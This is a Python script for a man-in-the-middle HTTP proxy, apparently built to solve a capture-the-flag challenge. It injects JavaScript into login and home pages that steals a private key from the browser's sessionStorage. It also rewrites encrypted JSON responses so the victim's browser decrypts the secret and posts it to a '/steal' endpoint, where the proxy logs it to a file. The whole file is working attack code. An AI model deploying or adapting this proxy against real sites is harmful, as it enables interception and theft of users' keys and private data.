#!/usr/bin/env python3
import datetime
import json
import socket
import threading

UPSTREAM_HOST = "127.0.0.1"
UPSTREAM_PORT = 80
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 1500
LOG_PATH = "/tmp/proxy/captured.log"
FLAG_PATH = "/tmp/proxy/stolen_flag.txt"
INJECT_SNIPPET = (
    "</pre><script>(async()=>{try{const key=sessionStorage.getItem('sessionPrivateKey');"
    "if(!key)return;await fetch('/steal',{method:'POST',headers:{'Content-Type':'application/json'},"
    "body:JSON.stringify({key})});}catch(e){console.error(e);}})();</script><pre>"
)

log_lock = threading.Lock()
flag_lock = threading.Lock()


def log(message):
    timestamp = datetime.datetime.utcnow().isoformat()
    with log_lock:
        with open(LOG_PATH, 'a') as fh:
            fh.write(f"[{timestamp}] {message}\n")


def save_flag(text):
    with flag_lock:
        with open(FLAG_PATH, 'a') as fh:
            fh.write(f"{datetime.datetime.utcnow().isoformat()} {text}\n")
        log(f"Captured flag snippet: {text[:40]}...")


def recv_until(sock, delimiter):
    data = bytearray()
    while delimiter not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def read_http_message(sock):
    data = recv_until(sock, b"\r\n\r\n")
    if not data:
        return None
    if b"\r\n\r\n" not in data:
        return None
    header_bytes, body = data.split(b"\r\n\r\n", 1)
    header_text = header_bytes.decode('iso-8859-1')
    lines = header_text.split('\r\n')
    start_line = lines[0]
    headers = []
    header_lookup = {}
    for line in lines[1:]:
        if not line:
            continue
        if ':' in line:
            k, v = line.split(':', 1)
            key = k.strip()
            value = v.strip()
            headers.append((key, value))
            header_lookup.setdefault(key.lower(), []).append(value)
    content_length = int(header_lookup.get('content-length', ['0'])[0])
    body_bytes = body
    remaining = content_length - len(body_bytes)
    while remaining > 0:
        chunk = sock.recv(remaining)
        if not chunk:
            break
        body_bytes += chunk
        remaining -= len(chunk)
    raw = header_bytes + b"\r\n\r\n" + body_bytes
    return start_line, headers, header_lookup, body_bytes, raw


def rebuild_response(status_line, headers, body):
    new_headers = []
    length_set = False
    for key, value in headers:
        if key.lower() == 'content-length':
            new_headers.append((key, str(len(body))))
            length_set = True
        else:
            new_headers.append((key, value))
    if not length_set:
        new_headers.append(('Content-Length', str(len(body))))
    header_lines = [status_line] + [f"{k}: {v}" for k, v in new_headers] + ['', '']
    return "\r\n".join(header_lines).encode('iso-8859-1') + body


def inject_html(body):
    try:
        text = body.decode('utf-8')
    except UnicodeDecodeError:
        return body
    lower = text.lower()
    idx = lower.rfind('</body>')
    if idx == -1:
        return body
    injected = text[:idx] + INJECT_SNIPPET + text[idx:]
    return injected.encode('utf-8')


def escape_js(value):
    return value.replace('\\', '\\\\').replace('"', '\\"')


def build_json_payload(ciphertext):
    escaped = escape_js(ciphertext)
    script = (
        "</pre><script>(async()=>{try{const priv=sessionStorage.getItem('sessionPrivateKey');"
        "if(!priv)return;const crypt=new JSEncrypt();crypt.setPrivateKey(priv);"
        f"const cipher=\"{escaped}\";"
        "const plain=crypt.decrypt(cipher);"
        "if(plain){await fetch('/steal',{method:'POST',headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({flag:plain})});}}catch(e){console.error(e);}})();</script><pre>"
        f"{ciphertext}"
    )
    return script


def modify_flag_response(body):
    try:
        data = json.loads(body.decode())
    except Exception:
        return body
    ciphertext = data.get('encrypted_content')
    if not ciphertext:
        return body
    data['encrypted_content'] = build_json_payload(ciphertext)
    return json.dumps(data).encode()


def handle_steal(body):
    try:
        data = json.loads(body.decode() or '{}')
        flag = data.get('flag') or data.get('key')
        if flag:
            save_flag(flag)
    except Exception as exc:
        log(f"Error parsing steal payload: {exc}")


def forward_request(raw_request):
    upstream = socket.create_connection((UPSTREAM_HOST, UPSTREAM_PORT))
    upstream.sendall(raw_request)
    data = bytearray()
    while True:
        chunk = upstream.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    upstream.close()
    return bytes(data)


def handle_client(client_sock, addr):
    log(f"Connection from {addr}")
    try:
        parsed = read_http_message(client_sock)
        if not parsed:
            client_sock.close()
            return
        request_line, req_headers, req_lookup, req_body, raw_request = parsed
        method, path, _ = request_line.split()
        log(f"{method} {path} from {addr}")
        if path == '/steal':
            handle_steal(req_body)
            response = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK"
            client_sock.sendall(response)
            client_sock.close()
            return
        response_bytes = forward_request(raw_request)
        resp_header, resp_body = response_bytes.split(b"\r\n\r\n", 1)
        header_text = resp_header.decode('iso-8859-1')
        lines = header_text.split('\r\n')
        status_line = lines[0]
        resp_headers = []
        resp_lookup = {}
        for line in lines[1:]:
            if not line:
                continue
            if ':' in line:
                k, v = line.split(':', 1)
                key = k.strip()
                value = v.strip()
                resp_headers.append((key, value))
                resp_lookup.setdefault(key.lower(), []).append(value)
        content_type = ' '.join(resp_lookup.get('content-type', []))
        modified = False
        if 'text/html' in content_type and path in ('/', '/login'):
            new_body = inject_html(resp_body)
            if new_body != resp_body:
                resp_body = new_body
                modified = True
        if path == '/request_encrypted' and 'application/json' in content_type:
            new_body = modify_flag_response(resp_body)
            if new_body != resp_body:
                resp_body = new_body
                modified = True
        if modified:
            response_bytes = rebuild_response(status_line, resp_headers, resp_body)
        client_sock.sendall(response_bytes)
    except Exception as exc:
        log(f"Error handling {addr}: {exc}")
    finally:
        try:
            client_sock.close()
        except Exception:
            pass


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(20)
    log("MITM proxy ready")
    while True:
        client, addr = server.accept()
        threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()


if __name__ == '__main__':
    main()
